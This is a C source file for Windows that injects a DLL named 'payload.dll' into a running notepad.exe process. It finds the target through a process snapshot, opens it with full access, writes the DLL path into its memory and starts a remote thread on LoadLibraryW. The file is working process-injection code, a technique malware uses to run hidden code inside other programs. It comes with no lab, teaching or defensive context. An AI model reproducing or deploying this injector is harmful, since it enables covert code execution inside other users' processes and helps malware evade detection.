#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>

// Attempts to inject a DLL into a process given a handle to the process and the DLL's name.
BOOL InjectLibraryIntoProcess(HANDLE processHandle, LPWSTR libraryName) {
    BOOL resultState = TRUE;
    LPVOID kernelLoadLibraryW = NULL;
    LPVOID allocatedMemory = NULL;
    DWORD sizeOfLibraryName = lstrlenW(libraryName) * sizeof(WCHAR);
    SIZE_T bytesWritten = NULL;
    HANDLE remoteThread = NULL;

    // Obtain a pointer to the LoadLibraryW function, which will be used to load the DLL.
    kernelLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    if (kernelLoadLibraryW == NULL) {
        resultState = FALSE;
        goto Cleanup;
    }

    // Allocate memory in the target process for the DLL path.
    allocatedMemory = VirtualAllocEx(processHandle, NULL, sizeOfLibraryName, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (allocatedMemory == NULL) {
        resultState = FALSE;
        goto Cleanup;
    }

    printf("Memory Allocated At : 0x%p Of Size : %d\n", allocatedMemory, sizeOfLibraryName);

    // Write the DLL path to the allocated memory in the target process.
    if (!WriteProcessMemory(processHandle, allocatedMemory, libraryName, sizeOfLibraryName, &bytesWritten) || bytesWritten != sizeOfLibraryName) {
        resultState = FALSE;
        goto Cleanup;
    }

    printf("Successfully written %d bytes!!\n", bytesWritten);

    // Create a remote thread in the target process that calls LoadLibraryW with the DLL path, effectively loading the DLL into the target process.
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)kernelLoadLibraryW, allocatedMemory, 0, NULL);
    if (remoteThread == NULL) {
        resultState = FALSE;
        goto Cleanup;
    }
    printf("Payload execution complete!\n");

Cleanup:
    if (remoteThread)
        CloseHandle(remoteThread);
    return resultState;
}

// Retrieves a handle to a process given its name.
BOOL RetrieveProcessHandle(LPWSTR targetProcessName, DWORD* processId, HANDLE* handleOfProcess) {
    HANDLE snapshotHandle = NULL;
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    // Take a snapshot of all processes in the system.
    snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (snapshotHandle == INVALID_HANDLE_VALUE) {
        printf("CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
        goto Finish;
    }

    // Iterate through the processes in the snapshot.
    if (!Process32First(snapshotHandle, &processEntry)) {
        printf("Process32First Failed With Error : %d \n", GetLastError());
        goto Finish;
    }

    do {
        WCHAR lowerCaseName[MAX_PATH * 2];

        // Convert the process name to lowercase to perform a case-insensitive comparison.
        if (processEntry.szExeFile) {
            DWORD length = lstrlenW(processEntry.szExeFile);
            DWORD i = 0;
            RtlSecureZeroMemory(lowerCaseName, MAX_PATH * 2);
            if (length < MAX_PATH * 2) {
                for (; i < length; i++)
                    lowerCaseName[i] = (WCHAR)tolower(processEntry.szExeFile[i]);
                lowerCaseName[i++] = '\0';
            }
        }

        // Check if the current process is the target process.
        if (wcscmp(lowerCaseName, targetProcessName) == 0) {
            *processId = processEntry.th32ProcessID;
            // Open the target process with all access.
            *handleOfProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processEntry.th32ProcessID);
            if (*handleOfProcess == NULL)
                printf("OpenProcess Failed With Error : %d \n", GetLastError());
            break;
        }
    } while (Process32Next(snapshotHandle, &processEntry));

Finish:
    if (snapshotHandle != NULL)
        CloseHandle(snapshotHandle);
    if (*processId == NULL || *handleOfProcess == NULL)
        return FALSE;
    return TRUE;
}

// Main function to perform DLL injection.
int InjectDLL() {
    HANDLE targetProcessHandle = NULL;
    DWORD targetProcessId = NULL;

    // Obtain the path to the current executable.
    wchar_t exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);

    // Trim the executable name from the path to get the directory.
    wchar_t* lastSlash = wcsrchr(exePath, L'\\');
    if (lastSlash != NULL) {
        *lastSlash = L'\0';
    }

    // Construct the path to the payload DLL.
    wchar_t dllPath[MAX_PATH];
    swprintf(dllPath, MAX_PATH, L"%s\\payload.dll", exePath);

    // The name of the target process to inject the DLL into.
    wchar_t processName[] = L"notepad.exe";

    wprintf(L"Searching for process ID of \"%s\" ... ", processName);
    if (!RetrieveProcessHandle(processName, &targetProcessId, &targetProcessHandle)) {
        printf("Process Not Found \n");
        return -1;
    }
    wprintf(L"Search Complete \n");

    printf("Target process PID: %d \n", targetProcessId);

    // Attempt to inject the DLL into the target process.
    if (!InjectLibraryIntoProcess(targetProcessHandle, dllPath)) {
        return -1;
    }

    // Clean up by closing the handle to the target process.
    CloseHandle(targetProcessHandle);
    return 0;
}
